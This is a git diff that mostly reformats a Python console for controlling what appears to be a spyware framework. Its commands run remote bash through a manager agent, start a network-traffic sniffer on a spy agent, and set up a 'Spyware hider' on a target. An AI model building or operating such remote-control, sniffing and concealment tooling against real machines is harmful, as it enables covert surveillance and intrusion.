@@ -6,6 +6,7 @@ from responce import Responce
 from status import Status
 from icecream import ic
 """
+
 from agent import Agent
 from operation import Operation
 from contParams import *
@@ -24,14 +25,17 @@ from funCode import FunCode
 #         self.spyAgent = Agent(s)
 #         self.managerAgent = Agent(s)
 
+
 def LOG(s: str):
-    print(f'LOG: {s}')
+    print(f"LOG: {s}")
+
 
 class Context:
     def __init__(self, operations):
         self.selected_operation: Operation = None
         self.oper_dict = operations
         self.cont_ident = 0
+
 
 # if you want to pass argument with multiple words use "word1 word2 ..."
 def parse_args(args: str):
@@ -49,7 +53,7 @@ def parse_args(args: str):
         elif in_quotes:
             if arg[-1] == '"':
                 quoted.append(arg[:-1])
-                parsed.append(' '.join(quoted))
+                parsed.append(" ".join(quoted))
                 in_quotes = False
             else:
                 quoted.append(arg)
@@ -66,6 +70,7 @@ def call_method_raw(obj, args: str):
     else:
         call_method(obj, args[0], *parse_args(args[1]))
 
+
 def call_method(obj, method: str, *args):
     if hasattr(obj, method):
         try:
@@ -78,10 +83,15 @@ def call_method(obj, method: str, *args):
 
 
 def print_methods(obj):
-        attributes = dir(obj)
-        methods = [attr for attr in attributes if callable(getattr(obj, attr)) and not attr.startswith("__")]
-        print("YAY: Available Methods: (q for exit)")
-        print(methods)
+    attributes = dir(obj)
+    methods = [
+        attr
+        for attr in attributes
+        if callable(getattr(obj, attr)) and not attr.startswith("__")
+    ]
+    print("YAY: Available Methods: (q for exit)")
+    print(methods)
+
 
 class UI:
     def __init__(self, operations: dict[str, Operation]) -> None:
@@ -111,10 +121,10 @@ class UI:
     def ops(self):
         print("YAY: Available operations:")
         for op_name in self.ctx.oper_dict.keys():
-            if (self.ctx.selected_operation == self.ctx.oper_dict[op_name]):
-                print("-> ", end='')
+            if self.ctx.selected_operation == self.ctx.oper_dict[op_name]:
+                print("-> ", end="")
             else:
-                print('   ', end='')
+                print("   ", end="")
             print(f"{op_name}")
 
     def rename(self, old_name, new_name):
@@ -136,7 +146,7 @@ class UI:
     def bash(self, cmd: str):
         if not self.is_op_active():
             return
-        res = self.manager('run_bash', cmd)
+        res = self.manager("run_bash", cmd)
         print(f"DB: {res=}")
         return res[1]
 
@@ -153,11 +163,11 @@ class UI:
             print(f"YAY: NetDriver: {self.ctx.selected_operation.netDriver}")
 
     def findNet(self):
-        nets = self.bash('ls /sys/class/net').split('\n')
+        nets = self.bash("ls /sys/class/net").split("\n")
         for net in nets:
-            if net != 'lo':
+            if net != "lo":
                 self.ctx.selected_operation.netDriver = net
-                LOG(f'Set {net=}')
+                LOG(f"Set {net=}")
                 return True
         print("OOPSIE: Could not find non localhost network device")
         return False
@@ -172,20 +182,29 @@ class UI:
                 return
         net_driver = self.ctx.selected_operation.netDriver
         params = ContParams(SnifferType, Params(SniffParams(time, net_driver.encode())))
-        print(self.ctx.selected_operation.spyAgent.runContraption(params, self.ctx.cont_ident))
+        print(
+            self.ctx.selected_operation.spyAgent.runContraption(
+                params, self.ctx.cont_ident
+            )
+        )
         self.ctx.cont_ident += 1
-
 
     def setup(self, targetPath, imagePath, mountPath):
         if not self.is_op_active():
-            return    
+            return
         try:
-            self.ctx.selected_operation.managerAgent.hider_setup(targetPath, imagePath, mountPath)
-            LOG(f'Setup Manager hider')
-            self.ctx.selected_operation.spyAgent.hider_setup(targetPath, imagePath, mountPath)
-            LOG(f'Setup Spyware hider')
+            self.ctx.selected_operation.managerAgent.hider_setup(
+                targetPath, imagePath, mountPath
+            )
+            LOG(f"Setup Manager hider")
+            self.ctx.selected_operation.spyAgent.hider_setup(
+                targetPath, imagePath, mountPath
+            )
+            LOG(f"Setup Spyware hider")
         except Exception as e:
-            print(f"DB: {e=}") # first trying to setup spyware hider will fail because no spyware
+            print(
+                f"DB: {e=}"
+            )  # first trying to setup spyware hider will fail because no spyware
 
     def check_ready(self):
         if not self.is_op_active():
@@ -211,14 +230,18 @@ class UI:
                 targetPath,
             )
 
-        
+    def list_ops_names(self):
+        for op_name in self.ctx.oper_dict.keys():
+            print(op_name)
+
+
 if __name__ == "__main__":
-    operations = {'mat': Operation('m'), 'buja': Operation('b')}
+    operations = {"mat": Operation("m"), "buja": Operation("b")}
     ui = UI(operations)
     ui.help()
 
-    value = input('$ ')
-    while value != 'q':
+    value = input("$ ")
+    while value != "q":
         args = value.split()
         call_method(ui, args[0], *args[1:])
-        value = input('$ ')
+        value = input("$ ")
